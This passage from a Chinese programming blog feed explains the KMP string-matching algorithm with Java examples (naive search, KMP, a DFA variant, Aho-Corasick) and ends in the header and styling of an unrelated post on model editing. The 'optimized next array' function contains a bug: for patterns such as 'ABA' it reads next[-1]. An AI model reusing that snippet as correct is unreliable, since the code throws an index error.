<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Ffind-the-index-of-the-first-occurrence-in-a-string%2F" target="_blank" title="https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/" ref="nofollow noopener noreferrer">28. 实现strStr()</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Frepeated-substring-pattern%2F" target="_blank" title="https://leetcode.cn/problems/repeated-substring-pattern/" ref="nofollow noopener noreferrer">459. 重复的子字符串</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Frepeated-string-match%2F" target="_blank" title="https://leetcode.cn/problems/repeated-string-match/" ref="nofollow noopener noreferrer">686. 重复叠加字符串匹配</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flongest-happy-prefix%2F" target="_blank" title="https://leetcode.cn/problems/longest-happy-prefix/" ref="nofollow noopener noreferrer">1392. 最长快乐前缀</a></li>
</ul>
<h2 data-id="heading-22">KMP算法</h2>
<p>KMP（Knuth-Morris-Pratt）算法是一种高效的字符串匹配算法，核心思想是<strong>利用已经部分匹配的信息，避免重复比较</strong>，在文本串中快速查找模式串。KMP算法特别适合<strong>处理长文本和重复性高的模式串</strong>，时间复杂度是O(m+n)，m是模式串长度，n是文本串长度。</p>
<p>KMP算法的关键在于构建一个部分匹配表（也叫失败函数或者next数组），这个表记录了当匹配失败时，模式串指针应该回退到的位置，让算法跳过已知不可能匹配的位置，提高匹配效率。</p>
<h3 data-id="heading-23">算法步骤</h3>
<p>KMP算法主要分为两个阶段：</p>
<ol>
<li>
<p><strong>预处理阶段</strong>：计算模式串的部分匹配表（next数组）</p>
<ul>
<li>构建一个数组，记录每个位置的最长相等前后缀长度</li>
<li>该数组用于在匹配失败时确定模式串指针的回退位置</li>
</ul>
</li>
<li>
<p><strong>匹配阶段</strong>：使用部分匹配表在文本串中查找模式串</p>
<ul>
<li>从左到右同时遍历文本串和模式串</li>
<li>当字符不匹配时，根据next数组回退模式串指针</li>
<li>当模式串完全匹配时，记录匹配位置并继续查找其他匹配</li>
</ul>
</li>
</ol>
<p>核心特性：</p>
<ul>
<li><strong>线性时间复杂度</strong>：O(m+n)，其中m是模式串长度，n是文本串长度</li>
<li><strong>高效利用历史信息</strong>：通过预处理避免了重复比较</li>
<li><strong>只需一次遍历文本串</strong>：文本串指针不会回退</li>
<li><strong>空间复杂度</strong>：O(m)，仅需存储模式串的部分匹配表</li>
<li><strong>适用场景</strong>：特别适合长文本和具有重复性的模式串</li>
</ul>
<h3 data-id="heading-24">基础实现</h3>
<h4 data-id="heading-25">暴力解法</h4>
<p>java</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NaiveStringMatcher</span> {
    
    <span class="hljs-comment">/**
     * 朴素字符串匹配算法
     * @param text 文本串
     * @param pattern 模式串
     * @return 匹配成功则返回模式串在文本串中的起始位置，否则返回-1
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">naiveSearch</span><span class="hljs-params">(<span class="hljs-type">String</span> text, <span class="hljs-type">String</span> pattern)</span> </span>{
        <span class="hljs-type">int</span> n = text.<span class="hljs-built_in">length</span>();
        <span class="hljs-type">int</span> m = pattern.<span class="hljs-built_in">length</span>();
        
        <span class="hljs-comment">// 特殊情况处理</span>
        <span class="hljs-keyword">if</span> (m == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">if</span> (n &lt; m) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
        
        <span class="hljs-comment">// 尝试所有可能的匹配位置</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= n - m; i++) {
            <span class="hljs-type">int</span> j;
            
            <span class="hljs-comment">// 从当前位置开始比较模式串和文本串</span>
            <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; m; j++) {
                <span class="hljs-keyword">if</span> (text.<span class="hljs-built_in">charAt</span>(i + j) != pattern.<span class="hljs-built_in">charAt</span>(j)) {
                    <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 发现不匹配字符，终止内层循环</span>
                }
            }
            
            <span class="hljs-comment">// 如果j等于m，说明模式串完全匹配</span>
            <span class="hljs-keyword">if</span> (j == m) {
                <span class="hljs-keyword">return</span> i; <span class="hljs-comment">// 返回匹配位置</span>
            }
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 未找到匹配</span>
    }
    
    <span class="hljs-comment">// 使用示例</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> </span>{
        <span class="hljs-type">String</span> text = <span class="hljs-string">"ABABDABACDABABCABAB"</span>;
        <span class="hljs-type">String</span> pattern = <span class="hljs-string">"ABABCABAB"</span>;
        
        <span class="hljs-type">int</span> position = <span class="hljs-built_in">naiveSearch</span>(text, pattern);
        
        <span class="hljs-keyword">if</span> (position == <span class="hljs-number">-1</span>) {
            System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"未找到匹配"</span>);
        } <span class="hljs-keyword">else</span> {
            System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"模式串在位置 "</span> + position + <span class="hljs-string">" 处匹配"</span>);
        }
    }
}
</code></pre>
<p>上述实现暴力枚举所有可能的匹配位置，逐一比较文本串与模式串的每个字符，直到找到完全匹配或确定不存在匹配</p>
<h4 data-id="heading-26">KMP算法的实现</h4>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class KMP {
    // 构建部分匹配表（next数组）
    private static int<span class="hljs-section">[]</span> buildNext(String pattern) {
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        int<span class="hljs-section">[]</span> <span class="hljs-attr">next</span> = new int[m]<span class="hljs-comment">;</span>
        next<span class="hljs-section">[0]</span> = 0<span class="hljs-comment">; // 第一个字符的最长相等前后缀长度为0</span>
        
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">1</span>, j = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; m; i++) {</span>
            // 当前字符不匹配，回退j
            while (j &gt; 0 &amp;&amp; pattern.charAt(i) != pattern.charAt(j)) {
                <span class="hljs-attr">j</span> = next[j - <span class="hljs-number">1</span>]<span class="hljs-comment">;</span>
            }
            
            // 当前字符匹配，j向前移动
            if (pattern.charAt(i) == pattern.charAt(j)) {
                j++<span class="hljs-comment">;</span>
            }
            
            // 记录当前位置的最长相等前后缀长度
            next<span class="hljs-section">[i]</span> = j<span class="hljs-comment">;</span>
        }
        
        return next<span class="hljs-comment">;</span>
    }
    
    // KMP搜索算法
    public static int kmpSearch(String text, String pattern) {
        if (<span class="hljs-attr">pattern</span> == null || pattern.length() == <span class="hljs-number">0</span>) {
            return 0<span class="hljs-comment">;</span>
        }
        
        if (<span class="hljs-attr">text</span> == null || text.length() &lt; pattern.length()) {
            return -1<span class="hljs-comment">;</span>
        }
        
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        
        // 构建next数组
        int<span class="hljs-section">[]</span> <span class="hljs-attr">next</span> = buildNext(pattern)<span class="hljs-comment">;</span>
        
        // 进行匹配
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; n; i++) {</span>
            // 当前字符不匹配，根据next数组回退j
            while (j &gt; 0 &amp;&amp; text.charAt(i) != pattern.charAt(j)) {
                <span class="hljs-attr">j</span> = next[j - <span class="hljs-number">1</span>]<span class="hljs-comment">;</span>
            }
            
            // 当前字符匹配，j向前移动
            if (text.charAt(i) == pattern.charAt(j)) {
                j++<span class="hljs-comment">;</span>
            }
            
            // 完全匹配，返回起始索引
            if (<span class="hljs-attr">j</span> == m) {
                return i - m + 1<span class="hljs-comment">;</span>
            }
        }
        
        return -1<span class="hljs-comment">; // 未找到匹配</span>
    }
    
    // 查找所有匹配位置
    public static List&lt;Integer&gt; kmpSearchAll(String text, String pattern) {
        List&lt;Integer&gt; <span class="hljs-attr">positions</span> = new ArrayList&lt;&gt;()<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">pattern</span> == null || pattern.length() == <span class="hljs-number">0</span>) {
            return positions<span class="hljs-comment">;</span>
        }
        
        if (<span class="hljs-attr">text</span> == null || text.length() &lt; pattern.length()) {
            return positions<span class="hljs-comment">;</span>
        }
        
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        
        // 构建next数组
        int<span class="hljs-section">[]</span> <span class="hljs-attr">next</span> = buildNext(pattern)<span class="hljs-comment">;</span>
        
        // 进行匹配
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; n; i++) {</span>
            // 当前字符不匹配，回退j
            while (j &gt; 0 &amp;&amp; text.charAt(i) != pattern.charAt(j)) {
                <span class="hljs-attr">j</span> = next[j - <span class="hljs-number">1</span>]<span class="hljs-comment">;</span>
            }
            
            // 当前字符匹配，j向前移动
            if (text.charAt(i) == pattern.charAt(j)) {
                j++<span class="hljs-comment">;</span>
            }
            
            // 完全匹配，记录位置并继续匹配
            if (<span class="hljs-attr">j</span> == m) {
                positions.add(i - m + 1)<span class="hljs-comment">;</span>
                // 回退j以寻找下一个匹配
                <span class="hljs-attr">j</span> = next[j - <span class="hljs-number">1</span>]<span class="hljs-comment">;</span>
            }
        }
        
        return positions<span class="hljs-comment">;</span>
    }
    
    public static void main(String<span class="hljs-section">[]</span> args) {
        String <span class="hljs-attr">text</span> = <span class="hljs-string">"ABABDABACDABABCABAB"</span><span class="hljs-comment">;</span>
        String <span class="hljs-attr">pattern</span> = <span class="hljs-string">"ABABCABAB"</span><span class="hljs-comment">;</span>
        
        int <span class="hljs-attr">pos</span> = kmpSearch(text, pattern)<span class="hljs-comment">;</span>
        List&lt;Integer&gt; <span class="hljs-attr">allPos</span> = kmpSearchAll(text, pattern)<span class="hljs-comment">;</span>
        
        System.out.println("文本: " + text)<span class="hljs-comment">;</span>
        System.out.println("模式: " + pattern)<span class="hljs-comment">;</span>
        System.out.println("首次匹配位置: " + (pos != -1 ? pos : "未找到"))<span class="hljs-comment">;</span>
        System.out.println("所有匹配位置: " + allPos)<span class="hljs-comment">;</span>
        
        // 打印next数组，帮助理解
        int<span class="hljs-section">[]</span> <span class="hljs-attr">next</span> = buildNext(pattern)<span class="hljs-comment">;</span>
        System.out.print("next数组: ")<span class="hljs-comment">;</span>
        for (int val : next) {
            System.out.print(val + " ")<span class="hljs-comment">;</span>
        }
        System.out.println()<span class="hljs-comment">;</span>
    }
}
</code></pre>
<p>在上述代码中：</p>
<p>java</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 当前字符不匹配，回退j</span>
<span class="hljs-selector-tag">while</span> (j &gt; <span class="hljs-number">0</span> &amp;&amp; text.<span class="hljs-built_in">charAt</span>(i) != pattern.<span class="hljs-built_in">charAt</span>(j)) {
    <span class="hljs-selector-tag">j</span> = <span class="hljs-selector-tag">next</span><span class="hljs-selector-attr">[j - 1]</span>;
}
</code></pre>
<p>是 KMP 算法的核心，在匹配失败时根据预先计算的next数组来确定模式串指针的回退位置。</p>
<h3 data-id="heading-27">优化</h3>
<p>优化后的 next 数组</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">// 优化next数组，避免匹配失败后回退到同样会失败的位置
private static int<span class="hljs-section">[]</span> buildOptimizedNext(String pattern) {
    int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
    int<span class="hljs-section">[]</span> <span class="hljs-attr">next</span> = new int[m]<span class="hljs-comment">;</span>
    next<span class="hljs-section">[0]</span> = 0<span class="hljs-comment">;</span>
    
    for (int <span class="hljs-attr">i</span> = <span class="hljs-number">1</span>, j = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; m; i++) {</span>
        while (j &gt; 0 &amp;&amp; pattern.charAt(i) != pattern.charAt(j)) {
            <span class="hljs-attr">j</span> = next[j - <span class="hljs-number">1</span>]<span class="hljs-comment">;</span>
        }
        
        if (pattern.charAt(i) == pattern.charAt(j)) {
            j++<span class="hljs-comment">;</span>
        }
        
        // 当前位置匹配失败时，如果回退位置的字符与当前位置相同，则继续回退
        if (i + 1 &lt; m &amp;&amp; pattern.charAt(i + 1) == pattern.charAt(j)) {
            next<span class="hljs-section">[i]</span> = next<span class="hljs-section">[j - 1]</span><span class="hljs-comment">;</span>
        } else {
            next<span class="hljs-section">[i]</span> = j<span class="hljs-comment">;</span>
        }
    }
    
    return next<span class="hljs-comment">;</span>
}
</code></pre>
<p>预处理减少分支实现</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">// 预处理字符映射，减少字符比较的分支
public static int kmpSearchOptimized(String text, String pattern) {
    if (<span class="hljs-attr">pattern</span> == null || pattern.length() == <span class="hljs-number">0</span>) {
        return 0<span class="hljs-comment">;</span>
    }
    
    if (<span class="hljs-attr">text</span> == null || text.length() &lt; pattern.length()) {
        return -1<span class="hljs-comment">;</span>
    }
    
    int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
    int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
    
    // 使用数组映射来加速字符比较（假设字符集为ASCII）
    // 为每个模式字符的每个位置创建一个状态转移表
    int<span class="hljs-section">[]</span><span class="hljs-section">[]</span> <span class="hljs-attr">dfa</span> = new int[<span class="hljs-number">256</span>][m]<span class="hljs-comment">;</span>
    
    // 初始化第一个字符的DFA
    dfa<span class="hljs-section">[pattern.charAt(0)]</span><span class="hljs-section">[0]</span> = 1<span class="hljs-comment">;</span>
    
    for (int <span class="hljs-attr">X</span> = <span class="hljs-number">0</span>, j = <span class="hljs-number">1</span><span class="hljs-comment">; j &lt; m; j++) {</span>
        // 复制匹配失败情况下的值
        for (int <span class="hljs-attr">c</span> = <span class="hljs-number">0</span><span class="hljs-comment">; c &lt; 256; c++) {</span>
            dfa<span class="hljs-section">[c]</span><span class="hljs-section">[j]</span> = dfa<span class="hljs-section">[c]</span><span class="hljs-section">[X]</span><span class="hljs-comment">;</span>
        }
        // 设置匹配成功情况下的值
        dfa<span class="hljs-section">[pattern.charAt(j)]</span><span class="hljs-section">[j]</span> = j + 1<span class="hljs-comment">;</span>
        // 更新重启状态
        <span class="hljs-attr">X</span> = dfa[pattern.charAt(j)][X]<span class="hljs-comment">;</span>
    }
    
    // 模式匹配
    int i, j<span class="hljs-comment">;</span>
    for (<span class="hljs-attr">i</span> = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; n &amp;&amp; j &lt; m; i++) {</span>
        <span class="hljs-attr">j</span> = dfa[text.charAt(i)][j]<span class="hljs-comment">;</span>
    }
    
    if (<span class="hljs-attr">j</span> == m) {
        return i - m<span class="hljs-comment">; // 找到匹配</span>
    } else {
        return -1<span class="hljs-comment">;    // 未找到匹配</span>
    }
}
</code></pre>
<h3 data-id="heading-28">优点</h3>
<ul>
<li>时间复杂度为O(m+n)，优于朴素的字符串匹配算法(暴力解法)</li>
<li>文本串只需扫描一次，不会回退</li>
<li>对于包含重复模式的字符串会高效</li>
<li>预处理模式串，可以多次用于不同的文本串</li>
<li>能快速跳过已知不会匹配的位置</li>
</ul>
<h3 data-id="heading-29">缺点</h3>
<ul>
<li>需要额外的空间存储next数组</li>
<li>构建next数组的逻辑较为复杂，不易理解</li>
<li>在模式串较短或无重复模式时，相比简单算法优势不明显</li>
<li>实现时容易出错，特别是处理边界情况</li>
</ul>
<h3 data-id="heading-30">应用场景</h3>
<p>1）生物信息学中的DNA序列匹配<br/>
2）网络入侵检测系统中的模式匹配<br/>
3）搜索引擎的关键词匹配<br/>
4）数据压缩算法中的模式识别</p>
<h3 data-id="heading-31">扩展：多模式字符串匹配</h3>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">// Aho-Corasick算法 - KMP的多模式扩展
public static class AhoCorasick {
    static class TrieNode {
        TrieNode<span class="hljs-section">[]</span> <span class="hljs-attr">children</span> = new TrieNode[<span class="hljs-number">256</span>]<span class="hljs-comment">;</span>
        TrieNode fail<span class="hljs-comment">;</span>
        List&lt;Integer&gt; <span class="hljs-attr">patternIndices</span> = new ArrayList&lt;&gt;()<span class="hljs-comment">;</span>
        
        public TrieNode() {
            <span class="hljs-attr">fail</span> = null<span class="hljs-comment">;</span>
        }
    }
    
    private TrieNode root<span class="hljs-comment">;</span>
    private String<span class="hljs-section">[]</span> patterns<span class="hljs-comment">;</span>
    
    public AhoCorasick(String<span class="hljs-section">[]</span> patterns) {
        <span class="hljs-attr">this.patterns</span> = patterns<span class="hljs-comment">;</span>
        buildTrie()<span class="hljs-comment">;</span>
        buildFailureLinks()<span class="hljs-comment">;</span>
    }
    
    private void buildTrie() {
        <span class="hljs-attr">root</span> = new TrieNode()<span class="hljs-comment">;</span>
        
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; patterns.length; i++) {</span>
            String <span class="hljs-attr">pattern</span> = patterns[i]<span class="hljs-comment">;</span>
            TrieNode <span class="hljs-attr">node</span> = root<span class="hljs-comment">;</span>
            
            for (char c : pattern.toCharArray()) {
                if (node.children<span class="hljs-section">[c]</span> == null) {
                    node.children<span class="hljs-section">[c]</span> = new TrieNode()<span class="hljs-comment">;</span>
                }
                <span class="hljs-attr">node</span> = node.children[c]<span class="hljs-comment">;</span>
            }
            
            node.patternIndices.add(i)<span class="hljs-comment">;</span>
        }
    }
    
    private void buildFailureLinks() {
        Queue&lt;TrieNode&gt; <span class="hljs-attr">queue</span> = new LinkedList&lt;&gt;()<span class="hljs-comment">;</span>
        
        // 初始化根节点的子节点
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 256; i++) {</span>
            if (root.children<span class="hljs-section">[i]</span> != null) {
                root.children<span class="hljs-section">[i]</span>.<span class="hljs-attr">fail</span> = root<span class="hljs-comment">;</span>
                queue.offer(root.children<span class="hljs-section">[i]</span>)<span class="hljs-comment">;</span>
            } else {
                root.children<span class="hljs-section">[i]</span> = root<span class="hljs-comment">;</span>
            }
        }
        
        // BFS构建失败链接
        while (!queue.isEmpty()) {
            TrieNode <span class="hljs-attr">node</span> = queue.poll()<span class="hljs-comment">;</span>
            
            for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 256; i++) {</span>
                if (node.children<span class="hljs-section">[i]</span> != null) {
                    TrieNode <span class="hljs-attr">failNode</span> = node.fail<span class="hljs-comment">;</span>
                    
                    while (failNode != root &amp;&amp; failNode.children<span class="hljs-section">[i]</span> == null) {
                        <span class="hljs-attr">failNode</span> = failNode.fail<span class="hljs-comment">;</span>
                    }
                    
                    <span class="hljs-attr">failNode</span> = failNode.children[i]<span class="hljs-comment">;</span>
                    node.children<span class="hljs-section">[i]</span>.<span class="hljs-attr">fail</span> = failNode<span class="hljs-comment">;</span>
                    
                    // 合并匹配结果
                    node.children<span class="hljs-section">[i]</span>.patternIndices.addAll(failNode.patternIndices)<span class="hljs-comment">;</span>
                    
                    queue.offer(node.children<span class="hljs-section">[i]</span>)<span class="hljs-comment">;</span>
                }
            }
        }
    }
    
    public List&lt;Pair&lt;Integer, Integer&gt;&gt; search(String text) {
        List&lt;Pair&lt;Integer, Integer&gt;&gt; <span class="hljs-attr">results</span> = new ArrayList&lt;&gt;()<span class="hljs-comment">;</span>
        TrieNode <span class="hljs-attr">currentState</span> = root<span class="hljs-comment">;</span>
        
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; text.length(); i++) {</span>
            char <span class="hljs-attr">c</span> = text.charAt(i)<span class="hljs-comment">;</span>
            
            while (currentState != root &amp;&amp; currentState.children<span class="hljs-section">[c]</span> == null) {
                <span class="hljs-attr">currentState</span> = currentState.fail<span class="hljs-comment">;</span>
            }
            
            <span class="hljs-attr">currentState</span> = currentState.children[c]<span class="hljs-comment">;</span>
            
            for (int patternIndex : currentState.patternIndices) {
                int <span class="hljs-attr">endPos</span> = i<span class="hljs-comment">;</span>
                int <span class="hljs-attr">startPos</span> = endPos - patterns[patternIndex].length() + <span class="hljs-number">1</span><span class="hljs-comment">;</span>
                results.add(new Pair&lt;&gt;(patternIndex, startPos))<span class="hljs-comment">;</span>
            }
        }
        
        return results<span class="hljs-comment">;</span>
    }
    
    static class Pair&lt;K, V&gt; {
        K first<span class="hljs-comment">;</span>
        V second<span class="hljs-comment">;</span>
        
        public Pair(K first, V second) {
            <span class="hljs-attr">this.first</span> = first<span class="hljs-comment">;</span>
            <span class="hljs-attr">this.second</span> = second<span class="hljs-comment">;</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-32">相关的 LeetCode 热门题目</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Ffind-the-index-of-the-first-occurrence-in-a-string%2F" target="_blank" title="https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/" ref="nofollow noopener noreferrer">28. 找出字符串中第一个匹配项的下标</a> - 标准的字符串匹配问题</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fshortest-palindrome%2F" target="_blank" title="https://leetcode.cn/problems/shortest-palindrome/" ref="nofollow noopener noreferrer">214. 最短回文串</a> - 可以使用KMP算法的next数组思想解决</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Frepeated-substring-pattern%2F" target="_blank" title="https://leetcode.cn/problems/repeated-substring-pattern/" ref="nofollow noopener noreferrer">459. 重复的子字符串</a> - 使用KMP的next数组判断字符串是否由重复子串构成</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flongest-happy-prefix%2F" target="_blank" title="https://leetcode.cn/problems/longest-happy-prefix/" ref="nofollow noopener noreferrer">1392. 最长快乐前缀</a></li>
</ul>
<p>KMP算法是字符串处理中的经典算法，用来解决字符串匹配问题，理解它对提升算法设计能力还是很有帮助的。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[模型编辑 vs 参数微调：给零算法基础AI从业者的讲解]]></title>    <link>https://juejin.cn/post/7584013833993895970</link>    <guid>https://juejin.cn/post/7584013833993895970</guid>    <pubDate>2025-12-16T07:16:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584013833993895970" data-draft-id="7584043969687273524" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="模型编辑 vs 参数微调：给零算法基础AI从业者的讲解"/> <meta itemprop="keywords" content="OpenAI,AIGC,AI编程"/> <meta itemprop="datePublished" content="2025-12-16T07:16:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="树獭叔叔"/> <meta itemprop="url" content="https://juejin.cn/user/3734382051604446"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            模型编辑 vs 参数微调：给零算法基础AI从业者的讲解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3734382051604446/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    树獭叔叔
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:16:32.000Z" title="Tue Dec 16 2025 07:16:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 